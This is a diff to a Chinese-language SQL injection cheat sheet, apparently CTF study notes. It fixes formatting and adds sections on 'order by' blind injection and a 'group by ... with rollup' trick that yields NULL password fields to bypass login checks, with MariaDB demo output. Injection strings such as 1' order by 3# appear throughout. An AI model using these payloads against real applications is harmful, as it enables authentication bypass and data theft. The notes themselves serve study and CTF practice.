@@ -98,7 +98,7 @@ select group_concat(table_name) from mysql.innodb_table_stats
 
   * ``--`` 
 
-* order by看字段数 先看看有几个回显点也可以用group by
+* ``order by``看字段数 先看看有几个回显点也可以用``group by``
 
   ```sql
   1' order by 3#
@@ -109,9 +109,9 @@ select group_concat(table_name) from mysql.innodb_table_stats
   Error
   ```
 
-* Union 联合注入
+* ``union`` 联合注入
 
-* limit
+* ``limit``
 
   ```sql
   limit i,n
@@ -322,6 +322,61 @@ thr7.start()
   * 格式化字符串逃逸
     https://zhuanlan.zhihu.com/p/115777073 
 
+  * order by 盲注
+    
+    1. 利用不同的order by 返回的结果盲注 类似 bool盲注
+
+    https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/
+
+    2. 利用 order by的特性进行盲注
+
+      ```
+      MariaDB [test]> select * from users union select 1,2,3 order by 3;
+      +----+----------+----------+
+      | Id | username | password |
+      +----+----------+----------+
+      |  1 | 2        | 3        |
+      |  1 | admin    | admin    |
+      |  2 | eki      | test123  |
+      +----+----------+----------+
+      3 rows in set (0.001 sec)
+
+      MariaDB [test]> select * from users union select 1,2,'~' order by 3;
+      +----+----------+----------+
+      | Id | username | password |
+      +----+----------+----------+
+      |  1 | admin    | admin    |
+      |  2 | eki      | test123  |
+      |  1 | 2        | ~        |
+      +----+----------+----------+
+      ```
+    *  select * from users2 where 1 group by password with rollup having password is NULL;
+    
+    3. 利用 with rollup 的特性构造字段 NULL 绕过验证
+       ```
+        MariaDB [test]> select * from users2 where 1 group by 1 with rollup;
+        +----+----------+----------+-------+
+        | Id | username | password | token |
+        +----+----------+----------+-------+
+        |  1 | eki      | test123  | 233   |
+        |  2 | admin    | admin    | 233   |
+        | NULL | admin    | admin    | 233   |
+        +----+----------+----------+-------+
+        MariaDB [test]> select * from users2 where 1 group by 2 with rollup;
+        +----+----------+----------+-------+
+        | Id | username | password | token |
+        +----+----------+----------+-------+
+        |  2 | admin    | admin    | 233   |
+        |  1 | eki      | test123  | 233   |
+        |  1 | NULL     | test123  | 233   |
+        +----+----------+----------+-------+
+        MariaDB [test]> select * from users2 where 1 group by password with rollup having password is NULL;
+        +----+----------+----------+-------+
+        | Id | username | password | token |
+        +----+----------+----------+-------+
+        |  1 | eki      | NULL     | 233   |
+        +----+----------+----------+-------+
+      ```
 ## 关于Sqlite
 
 sqlite每个db文件就是一个数据库，不存在``information_schema``数据库，但存在类似作用的表``sqlite_master``。
